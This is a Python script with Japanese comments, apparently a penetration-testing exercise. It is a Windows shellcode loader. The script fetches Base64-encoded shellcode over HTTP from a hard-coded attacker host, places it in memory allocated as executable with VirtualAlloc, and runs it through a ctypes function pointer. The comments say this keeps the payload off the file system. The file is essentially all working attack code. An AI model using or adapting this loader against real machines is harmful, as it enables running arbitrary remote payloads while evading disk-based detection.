#シェルコードの実行
#標的マシンに直接指令を出す、あるいはペネトレーションテストや攻撃用フレームワークから新しい攻撃モジュールを使用する。シェルコードを実行する場面。
#ファイルシステムに触れることなくマシン語のシェルコードを実行するには、シェルコードを格納するためにメモリ上にバッファを作成し、crypesモジュールを使ってそのメモリが指す関数ポインタを作成する。
#urlibを使って、ＷｅｂサーバからＢａｓｅ６４形式でシェルコードを受け取り実行する。

#kali
#service apache2 restart

from urllib import request

import base64
import ctypes


kernel32 = ctypes.windll.kernel32

#get_codeを呼び出してＢａｓｅ６４エンコードされたシェルコードをＷｅｂサーバから受け取る
def get_code(url):
    #
    with request.urlopen(url) as response:
        shellcode = base64.decodebytes(response.read())
    return shellcode

#シェルコードのバッファをメモリに書き込む
def write_memory(buf):
    length = len(buf)

    kernel32.VirtualAlloc.restype = ctypes.c_void_p
    #メモリへの書き込みを行う為に必要なメモリを確保し、シェルコードを含んでいるバッファを確保したメモリへと移動。
    kernel32.RtlMoveMemory.argtypes = (
        ctypes.c_void_p,
        ctypes.c_void_p,
        ctypes.c_size_t)

    #シェルコードが32,64ビットの両方で動くようにする。0x40はメモリ実行および、読み書きの権限を必要とする事を指定
    ptr = kernel32.VirtualAlloc(None, length, 0x3000, 0x40)
    kernel32.RtlMoveMemory(ptr, buf, length)
    #確保したメモリにバッファを移動させ、バッファへのポインタを返す
    return ptr


def run(shellcode):
    #Ｂａｓｅ６４デコードしたシェルコードを格納するためのバッファを確保
    buffer = ctypes.create_string_buffer(shellcode)
    ptr = write_memory(buffer)
    #バッファを関数ポインタに型変換
    shell_func = ctypes.cast(ptr, ctypes.CFUNCTYPE(None))
    #シェルコードを通常の関数と同じように実行
    shell_func()


if __name__ == '__main__':
    url = "http://192.168.56.103:80/share/my32shellcode.bin"
    shellcode = get_code(url)
    run(shellcode)